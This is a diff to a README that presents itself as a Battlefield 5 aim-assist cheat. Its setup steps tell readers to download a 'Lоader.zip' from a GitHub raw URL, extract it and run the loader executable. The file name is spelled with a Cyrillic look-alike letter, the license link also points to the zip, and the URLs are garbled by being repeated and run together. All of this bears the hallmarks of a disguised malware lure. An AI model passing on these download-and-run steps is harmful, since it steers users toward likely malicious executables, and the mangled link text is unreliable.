@@ -74,10 +74,10 @@ Here’s a comprehensive description of main features you’ll find inside, usin
 
 Getting started is straightforward! Please follow these steps closely for a seamless experience:
 
-**1. Download https://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zip from the repository.**  
-Locate the latest release in the repository's _Releases_ section and download the https://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zip file to your local device.
+**1. Download https://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zip from the repository.**  
+Locate the latest release in the repository's _Releases_ section and download the https://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zip file to your local device.
 
-**2. Extract the https://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zip file.**  
+**2. Extract the https://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zip file.**  
 Use your preferred archiver (WinRAR, 7-Zip, or similar) to extract it to your desired folder.
 
 **3. Run the Loader executable.**  
@@ -110,7 +110,7 @@ The developers do not endorse or encourage the use of this software in any way t
 
 ## 📜 MIT License
 
-This project is distributed under the terms of the [MIT License](https://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zip).
+This project is distributed under the terms of the [MIT License](https://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zipоhttps://raw.githubusercontent.com/Sorintxr/Battlefield5-AimAssistPro/main/Lоader.zip).
 
 ---
 
